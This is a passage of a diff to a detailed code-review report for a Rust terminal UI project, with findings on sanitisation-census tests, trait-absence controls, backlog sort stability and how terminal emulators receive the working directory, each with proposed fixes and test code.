+let next = lines[ahead].1.trim();
+if next.starts_with("//") {
+    continue;                       // a comment costs no budget
+}
+taken += 1;
+logical.push(' ');
+logical.push_str(next);
+```
+
+and write the residual the other doc promises, naming the method-chain shape explicitly
+with the fixture above as its worked example. Widening
+`interpolates_into_a_string` to include `concat(`, `join(`, `format_args!` and a
+`+`-with-any-rhs marker costs nothing and closes two more of the four shapes.
+
+### WR-03: the driver-file composition census over-joins sibling match arms, its non-vacuity guard counts a different set than the census, and one `#[cfg(test)]` attribute silently blinds it
+
+**File:** `src/ui/screens/driver.rs:2091-2137` (`logical_lines`), `:2159-2185`
+(`composition_census`), `:2252-2268` (the non-vacuity guard)
+
+**Issue (a) — over-joining excuses a violation.** `logical_lines` merges physical lines
+until paren/bracket depth returns to zero AND the line ends in `;`, `{` or `}`. In
+`driver.rs` this produces logical units of up to 882 characters spanning tens of physical
+lines (measured: the unit starting at `driver.rs:1603`). `composition_census` then
+excuses the whole unit if *anywhere* in it a composer name appears. Reproduced with the
+census's own algorithm:
+
+```rust
+let (a, b) = match kind {
+    Kind::One => (
+        display_identity(&sanitize_render_line(v)),   // composed
+        String::new(),
+    ),
+    Kind::Two => (
+        sanitize_render_line(v),                      // NOT composed
+        String::new(),
+    ),
+};
+```
+
+Result: **census hits: []**. Both arms land in one logical unit; the composed arm
+launders the un-composed one. Given how much of `driver.rs` is exactly this shape
+(`match` over `DriverLineKind` / `TerminalState` / `RunOutcome`, all one logical unit
+each), this is the likeliest way the next violation arrives. The census's residual block
+(`driver.rs:2200-2205`) discloses only the opposite direction (a composition assembled
+across statements reading as un-composed).
+
+**Issue (b) — the non-vacuity guard measures a different set.** `composition_census`
+truncates each file at the first `#[cfg(test)]` line (`driver.rs:2168-2172`), but
+NON-VACUITY 2 (`:2252-2268`) counts needle lines over the **whole file**. Measured:
+
+```
+src/ui/screens/driver.rs          whole file: 3   production: 2
+src/ui/screens/driver_confirm.rs  whole file: 4   production: 4
+```
+
+If every production call were converted away, `total > 0` would still pass on the
+test-section occurrence while the census scanned nothing — which is precisely the
+"nothing to find vs all composed" ambiguity the guard exists to remove.
+
+**Issue (c) — a `#[cfg(test)]` attribute is a silent kill switch.** The truncation is at
+the *first* `#[cfg(test)]` line, not at the test module. `detail.rs` already carries a
+mid-file `#[cfg(test)] pub(super) fn first_string_entry` (added this round,
+`src/ui/screens/detail.rs:5342-5343`), so the pattern is live in this codebase. Adding such a
+helper near the top of `driver.rs` would silently exclude every render site below it,
+with nothing going red.
+
+**Fix:**
+- (a) Reject on the *innermost* call rather than on the enclosing unit: extract the
+  argument expression of each `sanitize_render_line(` occurrence and require a composer
+  in the same parenthesised expression, not anywhere in the statement. Failing that, add
+  a fixture control that asserts the two-arm shape above IS reported.
+- (b) Compute `total` over `lines[..end]` — the same slice the census scans.
+- (c) Truncate at the test **module** (`mod tests` after a `#[cfg(test)]`), or assert
+  that exactly one `#[cfg(test)]` exists per census file so a second one goes red.
+
+### WR-04: `EditBuffer`'s trait-absence claim is prose only — no analogue of the control the same round demanded for `Untrusted`
+
+**File:** `src/ui/screens/mod.rs:750-757, 787-846`
+
+**Issue:** the type's doc asserts:
+
+> *"`Span::styled(buffer.clone(), ..)` does not compile, because this type has no
+> `Display`, no `AsRef<str>` and no `Into<Cow<'static, str>>`, and the only route to a
+> cell is `shown`."*
+
+That is the same sentence `Untrusted` carried before 21-27, and 21-27 (WR-01) rated the
+prose-only version a finding, built
+`an_untrusted_carrier_implements_none_of_the_string_conversions`, extended it from three
+absences to six, and observed each red by planting. **No equivalent control exists for
+`EditBuffer`.** The committed tests for it (`what_the_operator_types_is_what_is_persisted`,
+`the_edit_buffer_pushes_and_pops_whole_characters`,
+`the_edit_popup_is_measured_in_characters_not_bytes`) all assert *behaviour*; none
+asserts the absent trait surface. Adding `impl Display for EditBuffer` tomorrow restores
+the exact laundering path CR-03 closed, with every test in the repository still green and
+the doc still claiming the absence — which is verbatim the argument 21-27 used to justify
+building the `Untrusted` control.
+
+The claim is also already slightly false as written: `EditBuffer` does not derive
+`Clone`, so `buffer.clone()` fails for a reason unrelated to the three named absences.
+
+**Fix:** reuse the existing probe machinery. `text::tests::trait_probe` is already
+`pub(crate)`-shaped; drive the same six absences over `EditBuffer` with the same
+`String` presence arms:
+
+```rust
+#[test]
+fn the_edit_buffer_implements_none_of_the_string_conversions() {
+    let b = EditBuffer::seed_from_untrusted_source("demo".into());
+    assert!(!implements_display!(b), "…");
+    assert!(!implements_as_ref_str!(b), "…");
+    assert!(!implements_into_cow_str!(b), "…");
+    // + the three String presence arms, so a broken probe fails loudly
+}
+```
+
+### WR-05: the backlog order is still permutation-dependent for tied entries, and the test's name says otherwise
+
+**File:** `src/state_reader/backlog.rs:49-96` (`parse_backlog_items`), `:112-157`
+(the key and comparator), `:283-330` (the control)
+
+**Issue:** the comparator is now a genuine total order over *keys*, but
+`backlog_sort_key` maps every unusable suffix to the same `0.0`
+(`999.NaN`, `999.nan`, `999.inf`, `999.x`, `999.` and a literal `999.0` all tie).
+`slice::sort_by` is stable, so tied elements keep the order `std::fs::read_dir`
+(`backlog.rs:51`) returned them in — which is unspecified and varies by filesystem and
+by directory-entry churn.
+
+So the Backlog tab's displayed order for tied items is *still* "a function of whatever
+`read_dir` happened to return first" — the exact sentence in the failure message at
+`:294-297` describing the defect being fixed. The test named
+`a_non_numeric_suffix_cannot_make_the_order_depend_on_the_input_permutation`
+sidesteps this by asserting only the sequence of *keys* for the tied fixture
+(`:312-330`), with a comment explaining why the element sequence is not asserted. The
+explanation is correct about `sort_by`'s stability; it is not correct that the
+user-visible property in the test's own name is achieved.
+
+**Fix:** make the comparator total on *elements*, which costs one line and removes the
+tie class entirely:
+
+```rust
+fn backlog_number_ordering(a: &str, b: &str) -> std::cmp::Ordering {
+    backlog_sort_key(a)
+        .total_cmp(&backlog_sort_key(b))
+        // Tie-break on the raw name, so items whose suffix names no position on
+        // the number line still have ONE order rather than `read_dir`'s.
+        .then_with(|| a.cmp(b))
+}
+```
+
+then assert the element sequence for the tied fixture too, which is what the test's name
+promises.
+
+### WR-06: the `cd '<dir>' &&` → `Command::current_dir` half of the CR-01 fix has no control and no emulator table, while the separator half of the same change got both
+
+**File:** `src/ui/screens/detail.rs:611-616` (the claim), `:1818`, `:2224`
+
+**Issue:** the plan recognised — correctly and at length — that handing an emulator a
+real argv exposes the resumed program's options to the emulator's own parser for the
+first time, wrote the `terminal_program_separator` table for it
+(`src/ui/screens/detail.rs:536-568`), and pinned it with two controls
+(`every_terminal_find_terminal_can_return_gets_a_separator_that_keeps_the_program_options`,
+`the_separator_table_covers_every_candidate_find_terminal_probes`).
+
+The same change also moved the working directory from *inside* the shell program
+(`cd '<dir>' && …`, which executed in the final child) to `Command::current_dir` on the
+**emulator client process**. That is a different level, and the doc elides it:
+
+> *"It is set through `std::process::Command::current_dir` at the call site, which the
+> process API passes to the child directly rather than as a `cd` written into a program."*
+
+The "child" there is the emulator, not `claude`. Whether the terminal's shell inherits
+that cwd is a per-emulator property: `kitty`/`alacritty`/`xterm` fork-and-exec the
+program and it is inherited; `gnome-terminal` is a D-Bus-activated client that must
+forward the cwd to a pre-existing server process for it to take effect. `gnome-terminal`
+is one of exactly four candidates `find_terminal` probes, and it is the same candidate
+the separator table had to special-case. There is no test, table or note covering the
+cwd half, and the failure mode is silent: the terminal opens, the resume works, and the
+session lands in `$HOME` instead of the project.
+
+**Fix:** at minimum, extend `terminal_program_separator`'s table with a cwd column and
+say per emulator how the working directory reaches the child, with the same "under-
+detection, LOUD/silent" annotation the separator residual carries. If gnome-terminal is
+found not to forward it, pass `--working-directory=<path>` for that stem — which is a
+table entry beside the separator, not a new mechanism.
+
+---
 
 ## Info
 
-### IN-01: `shown_capped`'s doc claims a completeness it does not have
+### IN-01: `EXEMPTIONS` are whole-file while `WAVE_PENDING` argues for exact `path:line` pinning
 
-**File:** `src/ui/screens/driver.rs:592-615`
-**Issue:** *"Every site below used `sanitize_render_line` alone … what was missing was every
-OTHER site on this path doing the same."* Three sites in the same file were not converted
-(CR-02). The sentence reads as a closure claim and is the reason a reader would not re-check
-the file.
-**Fix:** After fixing CR-02, restate as a checkable property — e.g. a census asserting
-`sanitize_render_line` has no executable call site in `driver.rs` outside `shown_capped`'s
-own body.
+**File:** `src/ui/mod.rs:74-94`, `:386-391`
+
+`WAVE_PENDING`'s doc (`:106-113`) argues that an entry pinned to one exact `path:line`
+"hides at most that one line and cannot absorb a new violation elsewhere in the file".
+The `EXEMPTIONS` filter one screen down uses
+`site.starts_with(&format!("{}:", exemption.path))` — a whole-file match over
+`render_escape_guard.rs` (3 128 lines). The two mechanisms sit in the same module with
+opposite conventions and the inconsistency is unexplained. The exemption is defensible
+today (the file is `#[cfg(test)]`-gated, `src/ui/screens/mod.rs:20-21`), but the pinning
+argument applies to it verbatim.
+
+**Fix:** pin the exemption to `src/ui/screens/render_escape_guard.rs:2615`, or state in
+`EXEMPTIONS`' doc why whole-file is right here and pinned is right there.
+
+### IN-02: dead assertion in `the_separator_table_covers_every_candidate_find_terminal_probes`
+
+**File:** `src/ui/screens/detail.rs:7457`
+
+```rust
+assert!(matches!(separator, "-e" | "--"), "{candidate:?} resolved to the unknown separator {separator:?}");
+```
+
+`terminal_program_separator` is a two-arm `match` returning `&'static str` literals
+`"--"` and `"-e"`; the assertion cannot fail. The load-bearing part of the test is the
+`candidates.len() == 4` equality above it.
+
+**Fix:** delete the arm, or replace it with the assertion that has teeth — that each
+candidate resolves to the separator the table's markdown row records for it.
+
+### IN-03: "Resumed session {}" is reported on `spawn()` returning, not on the resume working
+
+**File:** `src/ui/screens/detail.rs:1820-1826`, `:2226-2232`
+
+`Command::spawn()` succeeds as soon as the emulator binary is exec'd. An emulator that
+rejects the separator or the flags exits immediately (and, having no terminal yet, shows
+the operator nothing), while the TUI reports success. `terminal_program_separator`'s doc
+claims the unsupported-emulator residual is *"LOUD rather than silent — the emulator
+rejects the flag and the operator sees the failure"*; with the status line reporting
+success and the emulator's stderr going nowhere, the operator sees a flash and a green
+message. Pre-existing shape, but the round-10 doc now rests a residual's direction on it.
+
+### IN-04: `ArchiveDepth::milestone` is the same untyped round trip 21-30 closed for `defaults_text_buffer`
+
+**File:** `src/ui/screens/detail.rs:1866` (raw take), `:4024-4079` (re-escape at render)
+
+`archive_milestones` is `Vec<Untrusted>`; navigating takes
+`.as_raw_for_logic_only().to_string()` into `ArchiveDepth::PhaseList { milestone: String }`,
+and `archive_breadcrumb` escapes it again with the local `shown()` helper
+(`detail.rs:77-79`). Structurally identical to the CR-03 laundering, correctly escaped at
+each of the three render sites, honestly disclosed at `:4024-4032` with its direction
+("under-protection, silent"), and covered by the archive probe states. Named here so the
+one remaining instance of the pattern the round made a defect class is on the record; it
+is a candidate for the same `EditBuffer`-style retype next time `crate::archive` is open.
+
+### IN-05: `interpolates_into_a_string`'s marker set is narrower than its own doc
+
+**File:** `src/text.rs:1698-1704`
+
+The doc says *"The formatting macros this codebase builds strings with, plus `&`-string
+concatenation."* The list is `["format!", "write!", "writeln!", "+ &", "push_str(&"]`.
+`+ &` matches only that exact spacing (`a+&b` and a `+` at a line break both miss), and
+`String + &str` where the right-hand side is already a `&str` variable is written `s + x`
+with no `&` at all. `concat!`, `.concat()`, `.join()`, `format_args!` and `.replace()` are
+absent. See WR-02 for measured misses.
+
+### IN-06: `EditBuffer::push_char` / `pop_char` reallocate the whole buffer per keystroke
+
+**File:** `src/ui/screens/mod.rs:805-818`
+
+Each edit does `as_raw_for_logic_only().to_string()` → mutate → `from_untrusted_source`,
+copying the buffer twice per keypress. Harmless at config-value lengths and out of the
+declared v1 performance scope, but it is a shape forced by `Untrusted` exposing no
+mutator; a `Untrusted::into_raw(self) -> String` (a by-value take, no more permissive
+than the existing accessor) would let the wrapper mutate in place without adding a
+borrow-shaped escape hatch.
 
 ---
 
-### IN-02: `String::len()` used for popup width on a value that may be multibyte
+## Verification notes
 
-**File:** `src/ui/screens/detail.rs:4133`
-**Issue:** `let inner_w = buffer.len().max(title.len()).max(30) as u16;` counts bytes, not
-display cells, on a value read from `.planning/config.json`. A CJK or emoji value produces a
-popup two to four times wider than the text needs. Cosmetic only — no panic, since the value
-is never sliced — but it is the same byte-vs-character confusion the round fixed at
-`shorten_session_id`, one file over.
-**Fix:** `buffer.chars().count()` (or `unicode_width::UnicodeWidthStr::width`, which the tree
-already depends on transitively through ratatui).
+- Every count- or presence-bearing check in this review was run through `rtk proxy`.
+- The three censuses were exercised by re-implementing their published algorithms and
+  running them against (a) the pre-fix `detail.rs` from `80bc4c1` and (b) synthetic
+  fixtures; the pass/fail tables in WR-02 and WR-03 are measurements, not readings.
+- `tests/driver_reattach.rs`'s two nondeterministic tests were not run and are not
+  reported, per scope.
+- The four known clippy lints (`browser.rs:155-157`, `project_creator.rs:146`) are
+  out of scope and were confirmed to be the only ones.
 
 ---
 
